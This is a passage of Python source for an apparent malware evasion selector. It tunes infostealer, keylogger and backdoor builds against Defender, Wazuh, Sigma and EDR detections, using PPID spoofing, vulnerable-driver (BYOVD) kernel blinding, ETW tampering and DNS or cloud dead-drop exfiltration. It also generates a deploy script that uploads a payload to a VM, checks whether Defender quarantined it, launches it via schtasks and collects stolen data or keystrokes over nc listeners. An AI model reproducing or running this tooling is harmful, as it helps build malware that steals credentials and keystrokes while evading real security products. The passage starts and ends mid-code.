    {"if": ("network_stealth", "domain_front"), "then_prefer": {"exfil": ["steganography", "dead_drop_cloud", "https_post", "winhttp_api"]}},

    # Phantom DLL injection pairs with mapped_section memory
    {"if": ("injection_method", "phantom_dll"), "then_prefer": {"memory_residence": ["mapped_section", "module_stomp"]}},
]


def get_type_layers(malware_type):
    """Return the type-specific layers for a malware type."""
    return TYPE_LAYERS.get(malware_type, {})


def get_all_layers(malware_type):
    """Return combined universal + type-specific layers."""
    all_layers = dict(LAYERS)
    all_layers.update(get_type_layers(malware_type))
    return all_layers


def apply_constraints(config, malware_type, protected=None):
    """Apply architectural constraints — prefer compatible options.
    protected: set of dim names that should NOT be overridden (e.g. boss dims being solved)."""
    all_layers = get_all_layers(malware_type)
    protected = protected or set()
    for constraint in ARCH_CONSTRAINTS:
        cond_layer, cond_value = constraint["if"]
        if config.get(cond_layer) == cond_value:
            for target_layer, preferred in constraint.get("then_prefer", {}).items():
                if target_layer in protected:
                    continue
                if target_layer in all_layers and config.get(target_layer) not in preferred:
                    for pref in preferred:
                        if pref in all_layers[target_layer]["options"]:
                            config[target_layer] = pref
                            break
    return config


# Detection signal → which layers to change and what to avoid
DETECTION_RULES = [
    {
        "signals": ["Trojan:Win32", "TrojanSpy", "Trojan:Script"],
        "desc": "Generic trojan signature — static analysis flagged imports or strings",
        "changes": {
            "api_resolve": {"avoid": ["direct_import", "loadlibrary"], "prefer": ["api_hash_djb2", "peb_walk"]},
            "data_obfuscation": {"avoid": ["plaintext"], "prefer": ["stack_strings", "aes_encrypt"]},
        },
    },
    {
        "signals": ["Behavior:Win32", "BehaviorBlocked"],
        "desc": "Behavioral detection — EDR saw suspicious action sequence",
        "changes": {
            "timing": {"avoid": ["immediate", "staged_jitter"], "prefer": ["deferred", "triggered"]},
            "execution": {"avoid": ["sequential", "threaded"], "prefer": ["callback_abuse", "callback_enumwindows", "callback_certenumsystem", "callback_copyfile2", "callback_enumrestype", "fiber"]},
            "process": {"avoid": ["standalone"], "prefer": ["ppid_spoof_svchost", "ppid_spoof_runtimebroker", "ppid_spoof_sihost", "ppid_spoof_dllhost", "dll_sideload"]},
        },
    },
    {
        "signals": ["HackTool", "Hacktool:Win32"],
        "desc": "Flagged as hacking tool — likely known tool signature",
        "changes": {
            "data_obfuscation": {"avoid": ["plaintext", "xor_encrypt"], "prefer": ["aes_encrypt"]},
            "api_resolve": {"avoid": ["direct_import"], "prefer": ["indirect_syscall"]},
        },
    },
    {
        "signals": ["Exploit:", "CVE-"],
        "desc": "Exploit detection — code pattern matched known exploit",
        "changes": {
            "data_obfuscation": {"avoid": ["plaintext"], "prefer": ["stack_strings"]},
            "execution": {"avoid": ["sequential"], "prefer": ["apc_self", "callback_abuse"]},
        },
    },
    {
        "signals": ["PWS:Win32", "Stealer", "CredentialAccess"],
        "desc": "Password stealer detection — credential access behavior flagged",
        "changes": {
            "timing": {"avoid": ["immediate"], "prefer": ["triggered", "deferred"]},
            "exfil": {"avoid": ["tcp_direct"], "prefer": ["dns_txt", "https_post", "smb_write", "dns_exfil"]},
            "process": {"avoid": ["standalone"], "prefer": ["dll_sideload", "process_hollow"]},
        },
    },
    {
        "signals": ["Persistence", "RunKey", "StartupItem"],
        "desc": "Persistence mechanism detected",
        "changes": {
            "persistence": {"avoid": ["registry_run", "startup_folder"], "prefer": ["scheduled_task", "none"]},
        },
    },
    {
        "signals": ["Keylogger", "KeyLogger", "Spy:Win32"],
        "desc": "Keylogger-specific detection",
        "changes": {
            "api_resolve": {"avoid": ["direct_import"], "prefer": ["peb_walk", "indirect_syscall"]},
            "execution": {"avoid": ["sequential"], "prefer": ["callback_abuse", "callback_enumwindows", "callback_certenumsystem"]},
            "anti_analysis": {"avoid": ["none"], "prefer": ["anti_sandbox", "full"]},
        },
    },
    {
        "signals": ["Suspicious:Process", "SuspiciousParent"],
        "desc": "Process lineage flagged — suspicious parent or creation method",
        "changes": {
            "process": {"avoid": ["standalone", "ppid_spoof"], "prefer": ["ppid_spoof_taskhostw", "ppid_spoof_dllhost", "ppid_spoof_sihost", "dll_sideload", "process_hollow"]},
        },
    },
    {
        "signals": ["SMBWriteAnomaly", "SMB share", "wrote file to SMB"],
        "desc": "SMB write flagged as lateral movement — non-domain SMB file operation",
        "changes": {
            "exfil": {"avoid": ["smb_write"], "prefer": ["dead_drop_cloud", "named_pipe", "dns_txt"]},
        },
    },
    {
        "signals": ["PasteSiteExfiltration", "paste service", "paste.ee"],
        "desc": "Paste site exfiltration detected — known APT technique",
        "changes": {
            "exfil": {"avoid": ["paste_site"], "prefer": ["dead_drop_cloud", "dns_txt", "https_post"]},
        },
    },
    {
        "signals": ["NamedPipeDataChannel", "pipe name pattern"],
        "desc": "Named pipe data transfer from suspicious process",
        "changes": {
            "exfil": {"avoid": ["named_pipe"], "prefer": ["dead_drop_cloud", "https_post"]},
        },
    },
    {
        "signals": ["DNSTXTFingerprint", "DNS TXT query", "DNS tunneling"],
        "desc": "DNS-based exfiltration detected",
        "changes": {
            "exfil": {"avoid": ["dns_txt", "dns_exfil"], "prefer": ["dead_drop_cloud", "https_post", "named_pipe"]},
        },
    },
    {
        "signals": ["SuspiciousHTTPActivity", "HTTP POST", "unencrypted payload", "plaintext system identifiers"],
        "desc": "HTTP POST with unencrypted payload detected",
        "changes": {
            "exfil": {"avoid": ["http_post"], "prefer": ["https_post", "dead_drop_cloud", "winhttp_api"]},
        },
    },
    {
        "signals": ["GDriveAPIDetected", "Google Drive REST API", "Google Drive API"],
        "desc": "Google Drive API fingerprinted — OAuth and API calls detected",
        "changes": {
            "exfil": {"avoid": ["cloud_gdrive"], "prefer": ["cloud_onedrive", "https_post", "named_pipe"]},
        },
    },
    {
        "signals": ["CloudDropFromNonNative", "cloud sync folder"],
        "desc": "Cloud sync folder write from non-cloud process",
        "changes": {
            "process": {"prefer": ["shell_extension", "browser_extension"]},
        },
    },
    {
        "signals": ["OneDriveSyncFromNonShell", "OneDriveSync"],
        "desc": "OneDrive sync from non-explorer process — switch to shell_extension",
        "changes": {
            "process": {"prefer": ["shell_extension"]},
        },
    },
    {
        "signals": ["ConnectionToC2", "SuspiciousNetwork", "Beacon"],
        "desc": "Network behavior flagged — C2 pattern detected",
        "changes": {
            "exfil": {"avoid": ["tcp_direct", "http_post"], "prefer": ["dns_txt", "dns_exfil", "smb_write"]},
            "timing": {"avoid": ["immediate"], "prefer": ["workday", "triggered"]},
            "c2_paradigm": {"avoid": ["active_beacon", "websocket", "passive_listener"], "prefer": ["triggered_pipe", "dead_drop_cloud", "legit_service_poll", "dead_drop_dns"]},
        },
    },
    {
        "signals": ["ThreatGraphFullFingerprint", "ThreatGraph", "BehavioralFingerprint", "FullChain"],
        "desc": "Full behavioral fingerprinting — multi-dim profile mismatch, use quoted fallback",
        "changes": {},
    },
    {
        "signals": ["AMSI", "AmsiScanBuffer"],
        "desc": "AMSI triggered on content",
        "changes": {
            "data_obfuscation": {"avoid": ["plaintext", "xor_encrypt"], "prefer": ["aes_encrypt", "stack_strings"]},
        },
    },
    {
        "signals": ["SandboxDetected", "AnalysisEvasion"],
        "desc": "Anti-analysis was itself detected (EDR knows we check for sandboxes)",
        "changes": {
            "anti_analysis": {"avoid": ["anti_vm", "anti_sandbox", "full"], "prefer": ["anti_debug", "none"]},
            "timing": {"avoid": ["deferred"], "prefer": ["triggered"]},
        },
    },
    {
        "signals": ["WAZUH Level=12", "WAZUH Level=13", "WAZUH Level=14", "WAZUH Level=15"],
        "desc": "Wazuh critical alert — high-confidence detection",
        "changes": {
            "api_resolve": {"avoid": ["direct_import", "loadlibrary"], "prefer": ["indirect_syscall", "peb_walk"]},
            "data_obfuscation": {"avoid": ["plaintext", "xor_encrypt"], "prefer": ["aes_encrypt", "stack_strings"]},
            "execution": {"avoid": ["sequential"], "prefer": ["callback_abuse", "fiber"]},
        },
    },
    {
        "signals": ["WazuhExecution", "Wazuh MITRE:T1059", "Wazuh MITRE:T1218", "Wazuh MITRE:T1053"],
        "desc": "Wazuh MITRE-tagged detection — execution/proxy/scheduled task",
        "changes": {
            "process": {"avoid": ["standalone"], "prefer": ["dll_sideload", "ppid_spoof"]},
            "timing": {"avoid": ["immediate"], "prefer": ["triggered", "deferred"]},
        },
    },
    {
        "signals": ["WazuhC2", "Wazuh MITRE:T1071", "Wazuh MITRE:T1041", "Wazuh MITRE:T1048"],
        "desc": "Wazuh MITRE-tagged detection — C2/exfiltration",
        "changes": {
            "exfil": {"avoid": ["tcp_direct", "http_post"], "prefer": ["dns_exfil"]},
            "timing": {"avoid": ["immediate", "staged_jitter"], "prefer": ["workday", "triggered"]},
        },
    },
    {
        "signals": ["WazuhPersistence", "Wazuh MITRE:T1547", "Wazuh MITRE:T1546", "Wazuh MITRE:T1543"],
        "desc": "Wazuh MITRE-tagged detection — persistence",
        "changes": {
            "persistence": {"avoid": ["registry_run", "startup_folder"], "prefer": ["scheduled_task", "none"]},
        },
    },
    {
        "signals": ["Sysmon", "EventID 1", "process creation"],
        "desc": "Wazuh Sysmon-based detection — process creation telemetry",
        "changes": {
            "process": {"avoid": ["standalone"], "prefer": ["ppid_spoof", "dll_sideload"]},
            "timing": {"avoid": ["immediate"], "prefer": ["deferred"]},
        },
    },
    # ── Architectural layer detection rules ──
    {
        "signals": ["KeyboardHook", "SetWindowsHookEx", "WH_KEYBOARD", "HookInstall"],
        "desc": "Keyboard hook detected — change capture method away from hooks",
        "changes": {
            "capture_method": {"avoid": ["hook_ll", "msg_hook", "winevent_hook"], "prefer": ["getasynckeystate", "raw_input", "ui_automation", "directinput"]},
        },
    },
    {
        "signals": ["GetAsyncKeyState", "KeyStatePolling"],
        "desc": "Key state polling detected — switch to non-polling capture",
        "changes": {
            "capture_method": {"avoid": ["getasynckeystate", "getkeybstate"], "prefer": ["raw_input", "ui_automation", "clipboard_monitor", "directinput"]},
        },
    },
    {
        "signals": ["BeaconPattern", "PeriodicCallback", "C2Beacon", "RegularInterval"],
        "desc": "C2 beacon pattern detected — change paradigm away from active beaconing",
        "changes": {
            "c2_paradigm": {"avoid": ["active_beacon", "websocket"], "prefer": ["dead_drop_cloud", "triggered_pipe", "dead_drop_dns", "legit_service_poll"]},
            "exfil": {"avoid": ["tcp_direct", "http_post"], "prefer": ["cloud_onedrive", "dns_txt", "paste_site"]},
        },
    },
    {
        "signals": ["SpeedRunExfiltration", "short process lifetime", "burst_and_die",
                     "full execution cycle in"],
        "desc": "Speed-run exfiltration — too fast for behavioral baseline",
        "changes": {
            "process_lifetime": {"avoid": ["burst_and_die", "ephemeral_seconds"], "prefer": ["medium_minutes", "persistent"]},
            "timing": {"avoid": ["burst_then_die", "immediate"], "prefer": ["triggered", "workday"]},
        },
    },
    {
        "signals": ["CredentialAccess", "BrowserCredential", "DPAPI", "CryptUnprotectData"],
        "desc": "Credential access behavior flagged — narrow scope and slow collection",
        "changes": {
            "collection_strategy": {"avoid": ["bulk_immediate"], "prefer": ["incremental_slow", "event_triggered", "piggyback_legit"]},
            "target_scope": {"avoid": ["comprehensive"], "prefer": ["clipboard_only", "session_tokens", "environment_recon"]},
            "process_lifetime": {"avoid": ["persistent", "medium_minutes"], "prefer": ["ephemeral_seconds", "burst_and_die"]},
        },
    },
    {
        "signals": ["SuspiciousChild", "ChildProcess", "ProcessChain", "ParentChild"],
        "desc": "Suspicious process chain detected — use in-process execution, avoid child spawning",
        "changes": {
            "cmd_execution": {"avoid": ["child_cmd", "child_ps", "lolbin_proxy"], "prefer": ["in_process", "com_exec", "wmi_exec"]},
            "process": {"avoid": ["standalone"], "prefer": ["com_object", "service_dll", "shell_extension"]},
        },
    },
    {
        "signals": ["LargeUpload", "UnusualTransfer", "MITRE:T1567"],
        "desc": "Exfiltration pattern detected — switch to low-observable exfil and staging",
        "changes": {
            "exfil": {"avoid": ["tcp_direct", "http_post"], "prefer": ["cloud_onedrive", "dns_txt", "dead_drop", "steganography"]},
            "data_staging": {"avoid": ["temp_file"], "prefer": ["memory_only", "ads", "wmi_repo", "event_log"]},
        },
    },
    {
        "signals": ["LongRunning", "PersistentProcess", "BackgroundProcess"],
        "desc": "Long-running process flagged — shorten lifetime",
        "changes": {
            "process_lifetime": {"avoid": ["persistent", "medium_minutes"], "prefer": ["ephemeral_seconds", "ephemeral_staged", "burst_and_die"]},
        },
    },
    {
        "signals": ["FileTimestamp", "Timestomp", "MITRE:T1070"],
        "desc": "Anti-forensics detected — switch cleanup method",
        "changes": {
            "anti_forensics": {"avoid": ["timestomp", "self_delete"], "prefer": ["memory_only_full", "blend_noise", "none"]},
        },
    },
    {
        "signals": ["ClipboardAccess", "ClipboardMonitor"],
        "desc": "Clipboard monitoring detected — switch capture method",
        "changes": {
            "capture_method": {"avoid": ["clipboard_monitor"], "prefer": ["getasynckeystate", "raw_input", "directinput", "ui_automation"]},
        },
    },
    {
        "signals": ["SIGMA MEDIUM", "SIGMA HIGH", "SIGMA CRITICAL"],
        "desc": "Sigma rule fired — escalate all behavioral layers",
        "changes": {
            "process_lifetime": {"avoid": ["persistent", "medium_minutes"], "prefer": ["ephemeral_seconds", "burst_and_die"]},
            "anti_forensics": {"avoid": ["none"], "prefer": ["self_delete", "memory_only_full"]},
            "data_staging": {"avoid": ["temp_file"], "prefer": ["memory_only", "shared_memory"]},
            "process": {"avoid": ["standalone"], "prefer": ["com_object", "service_dll", "ppid_spoof_dllhost"]},
        },
    },
    {
        "signals": ["RawInput", "HID", "DirectInput"],
        "desc": "Raw input / HID capture detected — switch to polling or accessibility",
        "changes": {
            "capture_method": {"avoid": ["raw_input", "directinput"], "prefer": ["ui_automation", "getasynckeystate", "clipboard_monitor", "screen_ocr"]},
        },
    },
    {
        "signals": ["UIAutomation", "ScreenReader", "Accessibility"],
        "desc": "UI Automation detected — switch to lower-profile capture",
        "changes": {
            "capture_method": {"avoid": ["ui_automation", "winevent_hook"], "prefer": ["getasynckeystate", "clipboard_monitor", "etw_consumer"]},
        },
    },
    {
        "signals": ["COMHijack", "CLSID", "InProcServer"],
        "desc": "COM hijack persistence detected — use different persistence",
        "changes": {
            "persistence": {"avoid": ["com_hijack"], "prefer": ["dll_search_order", "wmi_subscription", "network_provider"]},
            "process": {"avoid": ["com_object"], "prefer": ["service_dll", "ppid_spoof_svchost"]},
        },
    },
    {
        "signals": ["WMIEvent", "WMISubscription", "MITRE:T1546.003"],
        "desc": "WMI persistence/execution detected — avoid WMI",
        "changes": {
            "persistence": {"avoid": ["wmi_subscription"], "prefer": ["dll_search_order", "com_hijack", "network_provider"]},
            "process": {"avoid": ["wmi_consumer"], "prefer": ["com_object", "service_dll"]},
            "cmd_execution": {"avoid": ["wmi_exec"], "prefer": ["in_process", "com_exec", "schtasks_exec"]},
        },
    },
    {
        "signals": ["DNSTunnel", "DNSExfil", "UnusualDNS", "MITRE:T1071.004"],
        "desc": "DNS exfiltration/C2 detected — switch transport",
        "changes": {
            "exfil": {"avoid": ["dns_exfil", "dns_txt"], "prefer": ["cloud_onedrive", "paste_site", "https_post", "smb_write"]},
            "c2_paradigm": {"avoid": ["dead_drop_dns"], "prefer": ["dead_drop_cloud", "triggered_pipe", "legit_service_poll"]},
        },
    },
    # ── Kernel-level detection rules ──
    {
        "signals": ["BYOVD", "VulnerableDriver", "DriverLoad", "KnownVulnerableDriver",
                     "SuspiciousDriverLoad", "MITRE:T1068", "MITRE:T1543.003"],
        "desc": "BYOVD/driver loading detected — switch to different vulnerable driver or remove kernel evasion",
        "changes": {
            "kernel_evasion": {"avoid": ["byovd_rtcore", "byovd_dbutil"], "prefer": ["byovd_procexp", "byovd_custom", "none"]},
        },
    },
    {
        "signals": ["KernelCallback", "CallbackRemoval", "CallbackManipulation",
                     "NotifyRoutine", "PsSetCreateProcess"],
        "desc": "Kernel callback manipulation detected — switch callback target or stop",
        "changes": {
            "callback_evasion": {"avoid": ["total_blind", "process_callbacks"], "prefer": ["minifilter_unlink", "image_callbacks", "none"]},
        },
    },
    {
        "signals": ["PPLBypass", "PPLTamper", "ProtectedProcess", "ProcessProtection",
                     "EPROCESS", "TokenManipulation"],
        "desc": "PPL/DKOM manipulation detected — switch protection technique",
        "changes": {
            "process_protection": {"avoid": ["strip_edr_ppl", "elevate_ppl"], "prefer": ["hide_process", "token_steal", "none"]},
        },
    },
    {
        "signals": ["ETWTamper", "ETWPatch", "ETWProvider", "ThreatIntelligence",
                     "EtwEventWrite", "ETWSessionManipulation"],
        "desc": "Kernel ETW manipulation detected — switch ETW bypass method",
        "changes": {
            "etw_kernel": {"avoid": ["dkom_provider", "session_unlink"], "prefer": ["hwbp_veh", "none"]},
            "etw_method": {"avoid": ["patch"], "prefer": ["hwbp_etw", "hwbp_both"]},
        },
    },
    {
        "signals": ["EDRKill", "EDRTermination", "SecurityServiceStop",
                     "MITRE:T1562.001", "TamperProtection"],
        "desc": "EDR process termination detected — switch to blinding instead of killing",
        "changes": {
            "process_protection": {"avoid": ["strip_edr_ppl"], "prefer": ["none"]},
            "callback_evasion": {"prefer": ["total_blind", "process_callbacks"]},
            "kernel_evasion": {"avoid": ["byovd_procexp"], "prefer": ["byovd_dbutil", "byovd_custom"]},
        },
    },
    {
        "signals": ["DriverBlocklist", "HVCI", "MemoryIntegrity", "CodeIntegrity"],
        "desc": "Driver blocklist or HVCI enforcement — need hash-mutated or 0-day driver",
        "changes": {
            "kernel_evasion": {"avoid": ["byovd_rtcore", "byovd_dbutil", "byovd_procexp"], "prefer": ["byovd_custom", "none"]},
        },
    },
    {
        "signals": ["MinifilterDetach", "FilterUnlink", "FltMgr"],
        "desc": "Minifilter unlinking detected — switch to callback-level blinding",
        "changes": {
            "callback_evasion": {"avoid": ["minifilter_unlink"], "prefer": ["total_blind", "process_callbacks", "none"]},
        },
    },
]

# Compile error → which layers are incompatible
COMPILE_ERROR_RULES = [
    {
        "pattern": r"undefined reference to.*NtAllocateVirtualMemory|NtCreateThreadEx",
        "fix": "indirect_syscall chunk may be missing ntdll stubs",
        "changes": {"api_resolve": {"avoid": ["indirect_syscall"], "prefer": ["peb_walk", "api_hash_djb2"]}},
    },
    {
        "pattern": r"undefined reference to.*ConvertThreadToFiber|SwitchToFiber",
        "fix": "fiber APIs need -lkernel32",
        "changes": {"execution": {"avoid": ["fiber"], "prefer": ["callback_abuse", "staged"]}},
    },
    {
        "pattern": r"undefined reference to.*Http|WinHttp|InternetOpen",
        "fix": "HTTP exfil needs -lwinhttp or -lwininet",
        "changes": {"exfil": {"avoid": ["http_post", "https_post"], "prefer": ["tcp_direct", "dns_exfil"]}},
    },
]

HISTORY_FILE = ".cache/evasion_history.json"


def load_history():
    if os.path.exists(HISTORY_FILE):
        with open(HISTORY_FILE) as f:
            return json.load(f)
    return {"runs": [], "detections": [], "successes": []}


def save_history(history):
    os.makedirs(os.path.dirname(HISTORY_FILE), exist_ok=True)
    with open(HISTORY_FILE, "w") as f:
        json.dump(history, f, indent=2)


def generate_deploy_script(malware_type, c2_port, pkg_dir):
    """Generate a self-contained deploy.sh tailored to the malware type.

    Backdoor: fully interactive C2 shell (REPL) until Ctrl+C
    Keylogger: persistent streaming to stdout until Ctrl+C
    Infostealer/ad_recon: fire-and-forget with nc listener
    All types: cleanup VM on exit (kill procs, del binaries, rm schtasks)
    """
    c2_port = str(c2_port)

    header = f'''#!/bin/bash
# Deploy {malware_type} payload to VM — auto-generated by evasion_selector
# Runs interactively until Ctrl+C, then cleans up the VM.
set -euo pipefail

DIR="$(cd "$(dirname "$0")" && pwd)"
PAYLOAD="$DIR/payload.exe"
VM_PORT="${{VM_PORT:-10022}}"
VM_USER="${{VM_USER:-vmuser}}"
VM_PASS="${{VM_PASS:-vmuser123}}"
C2_PORT="${{C2_PORT:-{c2_port}}}"
TASK_NAME="{malware_type}_test"

ssh_cmd() {{ sshpass -p "$VM_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p "$VM_PORT" "$VM_USER@localhost" "$@"; }}
scp_cmd() {{ sshpass -p "$VM_PASS" scp -o StrictHostKeyChecking=no -P "$VM_PORT" "$@"; }}

cleanup() {{
    echo ""
    echo "[*] Cleaning up VM..."
    ssh_cmd "taskkill /f /im payload.exe 2>nul & del /f C:\\\\Users\\\\$VM_USER\\\\Desktop\\\\payload.exe 2>nul & schtasks /delete /tn $TASK_NAME /f 2>nul" 2>/dev/null || true
    fuser -k $C2_PORT/tcp 2>/dev/null || true
    echo "[*] Done."
}}
trap cleanup EXIT INT TERM

[ -f "$PAYLOAD" ] || {{ echo "[!] payload.exe not found in $DIR"; exit 1; }}

echo ""
echo "============================================"
echo "  {malware_type.upper()} DEPLOY"
echo "============================================"
echo "  Payload:  $PAYLOAD"
echo "  C2 Port:  $C2_PORT"
echo "  Exit:     Ctrl+C to stop + cleanup"
echo "============================================"
echo ""

echo "[1/5] Checking VM..."
ssh_cmd "echo ok" >/dev/null 2>&1 || {{ echo "[!] VM not reachable"; exit 1; }}
echo "  OK"

echo "[2/5] Uploading..."
scp_cmd "$PAYLOAD" "$VM_USER@localhost:C:\\\\Users\\\\$VM_USER\\\\Desktop\\\\payload.exe" 2>/dev/null
echo "  OK — $(stat -c%s "$PAYLOAD") bytes"

echo "[3/5] Checking Defender quarantine (3s)..."
sleep 3
EXISTS=$(ssh_cmd "if exist C:\\\\Users\\\\$VM_USER\\\\Desktop\\\\payload.exe (echo EXISTS) else (echo GONE)" 2>/dev/null | tr -d '\\r')
if echo "$EXISTS" | grep -q "GONE"; then
    echo "  QUARANTINED"
    ssh_cmd 'powershell -Command "Get-MpThreatDetection | Select-Object -Last 1 | Format-List"' 2>/dev/null | sed 's/^/  /'
    exit 2
fi
echo "  OK — survived Defender"
'''

    if malware_type == "backdoor":
        execute_block = f'''
echo "[4/5] Executing via schtasks..."
ssh_cmd "schtasks /create /tn $TASK_NAME /tr C:\\\\Users\\\\$VM_USER\\\\Desktop\\\\payload.exe /sc once /st 00:00 /f >nul 2>&1 && schtasks /run /tn $TASK_NAME >nul 2>&1" 2>/dev/null
echo "  OK — backdoor launched on VM"

echo "[5/5] Starting interactive C2 shell..."
echo ""
echo "  Waiting for beacon callback on :$C2_PORT..."
echo "  Type 'help' for commands. Ctrl+C to exit + cleanup."
echo ""
fuser -k $C2_PORT/tcp 2>/dev/null || true
sleep 1

PROJECT_DIR="$DIR"
while [ "$PROJECT_DIR" != "/" ] && [ ! -f "$PROJECT_DIR/spec.yaml" ]; do
    PROJECT_DIR="$(dirname "$PROJECT_DIR")"
done
if [ -f "$PROJECT_DIR/scripts/c2_backdoor.py" ]; then
    python3 -u "$PROJECT_DIR/scripts/c2_backdoor.py" --port $C2_PORT
else
    echo "  [!] c2_backdoor.py not found — falling back to raw nc"
    echo "  (no interactive commands, just raw data capture)"
    nc -l -p $C2_PORT | tee "$DIR/exfil_$(date +%Y%m%d_%H%M%S).bin"
fi
'''
    elif malware_type == "keylogger":
        execute_block = f'''
echo "[4/5] Executing via schtasks (interactive session)..."
ssh_cmd "schtasks /create /tn $TASK_NAME /tr C:\\\\Users\\\\$VM_USER\\\\Desktop\\\\payload.exe /sc once /st 00:00 /f /it >nul 2>&1 && schtasks /run /tn $TASK_NAME >nul 2>&1" 2>/dev/null
echo "  OK — keylogger launched in Session 1"

echo "[5/5] Streaming keystrokes (Ctrl+C to stop + cleanup)..."
echo ""
echo "  Connect via RDP to generate keystrokes."
echo "  Live output below:"
echo "  ─────────────────────────────────────"
fuser -k $C2_PORT/tcp 2>/dev/null || true
sleep 1

LOG="$DIR/keylog_$(date +%Y%m%d_%H%M%S).log"
nc -lk -p $C2_PORT | tee "$LOG"
'''
    elif malware_type == "ad_recon":
        execute_block = f'''
echo "[4/5] Starting C2 listener..."
fuser -k $C2_PORT/tcp 2>/dev/null || true
sleep 1
C2_OUT="$DIR/exfil_$(date +%Y%m%d_%H%M%S).bin"
nc -l -p $C2_PORT > "$C2_OUT" &
C2_PID=$!
sleep 1
echo "  OK — listening on :$C2_PORT"

echo "[5/5] Executing..."
ssh_cmd "cmd /c C:\\\\Users\\\\$VM_USER\\\\Desktop\\\\payload.exe" >/dev/null 2>&1 &
echo "  OK — waiting for exfil (Ctrl+C to abort + cleanup)..."
echo ""
wait $C2_PID 2>/dev/null || true
C2_SIZE=$(stat -c%s "$C2_OUT" 2>/dev/null || echo 0)
echo ""
echo "  Received: $C2_SIZE bytes -> $C2_OUT"
if [ "$C2_SIZE" -gt 100 ]; then
    echo ""
    strings "$C2_OUT" | head -20
fi
'''
    else:  # infostealer
        execute_block = f'''
echo "[4/5] Starting C2 listener..."
fuser -k $C2_PORT/tcp 2>/dev/null || true
sleep 1
C2_OUT="$DIR/exfil_$(date +%Y%m%d_%H%M%S).bin"
nc -l -p $C2_PORT > "$C2_OUT" &
C2_PID=$!
sleep 1
echo "  OK — listening on :$C2_PORT"

echo "[5/5] Executing..."
ssh_cmd "cmd /c C:\\\\Users\\\\$VM_USER\\\\Desktop\\\\payload.exe" >/dev/null 2>&1 &
echo "  OK — waiting for exfil (Ctrl+C to abort + cleanup)..."
echo ""
wait $C2_PID 2>/dev/null || true
C2_SIZE=$(stat -c%s "$C2_OUT" 2>/dev/null || echo 0)
echo ""
echo "  Received: $C2_SIZE bytes -> $C2_OUT"
if [ "$C2_SIZE" -gt 100 ]; then
    echo ""
    echo "  Preview:"
    strings "$C2_OUT" | head -20
fi
'''

    script = header + execute_block
    deploy_path = pkg_dir / "deploy.sh"
    deploy_path.write_text(script)
    os.chmod(str(deploy_path), 0o755)


def analyze_detection(detection_text):
    """Parse detection text and return matching rules."""
    import re as _re_ad
    normalized = _re_ad.sub(r'MITRE:\s+', 'MITRE:', detection_text)
    matched = []
    for rule in DETECTION_RULES:
        for signal in rule["signals"]:
            if signal.lower() in normalized.lower():
                matched.append(rule)
                break
    return matched


def analyze_compile_error(error_text):
    """Parse compile errors and return matching rules."""
    matched = []
    for rule in COMPILE_ERROR_RULES:
        if re.search(rule["pattern"], error_text):
            matched.append(rule)
    return matched


def select_layers(detection_text="", compile_error="", previous_config=None, run_index=0, malware_type="infostealer"):
    """
    Select evasion layer options based on feedback.

    Two-tier selection: architectural layers first, then implementation layers.
    run_index: iteration number (0-based). Without detection feedback,
    each run progressively escalates evasion to try different combos.
    """
    history = load_history()
    all_layers = get_all_layers(malware_type)

    # Start from previous config or defaults
    config = {}
    for layer, info in all_layers.items():
        if previous_config and layer in previous_config:
            config[layer] = previous_config[layer]
        else:
            config[layer] = info["default"]

    avoid_map = {}  # layer → set of options to avoid
    prefer_map = {}  # layer → list of preferred options (ordered)
    _valid_profiles = []  # correlated multi-dim profiles from detection text
    _boss_dims = set()  # dimensions named in boss-level detections

    # Apply detection rules
    if detection_text:
        rules = analyze_detection(detection_text)
        for rule in rules:
            for layer, changes in rule["changes"].items():
                if layer not in avoid_map:
                    avoid_map[layer] = set()
                avoid_map[layer].update(changes.get("avoid", []))
                if layer not in prefer_map:
                    prefer_map[layer] = []
                prefer_map[layer].extend(changes.get("prefer", []))

        # Fallback 1: quoted values ('value') — always runs; avoid all quoted
        # values so cumulative failures are never repeated
        quoted_hits = {}
        for layer, info in all_layers.items():
            for opt in info["options"]:
                if f"'{opt}'" in detection_text:
                    quoted_hits.setdefault(layer, []).append(opt)
        for layer, opts in quoted_hits.items():
            for opt in opts:
                avoid_map.setdefault(layer, set()).add(opt)

        # Fallback 2: "using VALUE" pattern — correlation detections name the failing value
        import re as _re_fb
        using_matches = _re_fb.findall(r'\busing\s+(\w+)', detection_text)
        for val in using_matches:
            for layer, info in all_layers.items():
                if val in info["options"]:
                    avoid_map.setdefault(layer, set()).add(val)

        # Fallback 3: "normally performs/uses X/Y/Z" — list valid alternatives as preferred
        normally_matches = _re_fb.findall(r'normally (?:performs|uses)\s+([\w/]+)', detection_text)
        for val_list in normally_matches:
            for val in val_list.split('/'):
                for layer, info in all_layers.items():
                    if val in info["options"]:
                        prefer_map.setdefault(layer, []).append(val)

        # Fallback 4: "Only X" and "X and Y" — extract valid options from constraint text
        only_matches = _re_fb.findall(r'\bOnly\s+(\w+)', detection_text)
        and_after_only = _re_fb.findall(r'\bOnly\s+\w+\b.*?\band\s+(\w+)', detection_text)
        for val in only_matches + and_after_only:
            for layer, info in all_layers.items():
                if val in info["options"]:
                    prefer_map.setdefault(layer, []).append(val)

        # Fallback 5: "dimensions (dim1, dim2, ...)" + "Observed: dim=val" — boss detection
        # DON'T add observed values to avoid_map (a correct value in a wrong combo would
        # be wrongly avoided). Only identify boss dims for perturbation targeting.
        dim_list_match = _re_fb.search(r'dimensions?\s*\(([^)]+)\)', detection_text)
        if dim_list_match:
            for d in dim_list_match.group(1).split(','):
                d = d.strip()
                if d in all_layers:
                    _boss_dims.add(d)

        # Fallback 6: "X + Y + Z" profile patterns — parse full correlated profiles
        _valid_profiles = []
        profile_strs = _re_fb.findall(r'(\w+(?:\s*\+\s*\w+)+)', detection_text)
        for ps in profile_strs:
            parts = [p.strip() for p in ps.split('+')]
            profile = {}
            for part in parts:
                for layer, info in all_layers.items():
                    if part in info["options"]:
                        profile[layer] = part
                        break
            if len(profile) >= 2:
                _valid_profiles.append(profile)
        for prof in _valid_profiles:
            for layer, val in prof.items():
                if val not in avoid_map.get(layer, set()):
                    prefer_map.setdefault(layer, []).append(val)

    # Apply compile error rules
    if compile_error:
        rules = analyze_compile_error(compile_error)
        for rule in rules:
            for layer, changes in rule["changes"].items():
                if layer not in avoid_map:
                    avoid_map[layer] = set()
                avoid_map[layer].update(changes.get("avoid", []))
                if layer not in prefer_map:
                    prefer_map[layer] = []
                prefer_map[layer].extend(changes.get("prefer", []))

    # Apply history — avoid options that were detected before
    for run in history.get("runs", [])[-10:]:  # last 10 runs
        if run.get("detected"):
            run_config = run.get("config", {})
            for layer, option in run_config.items():
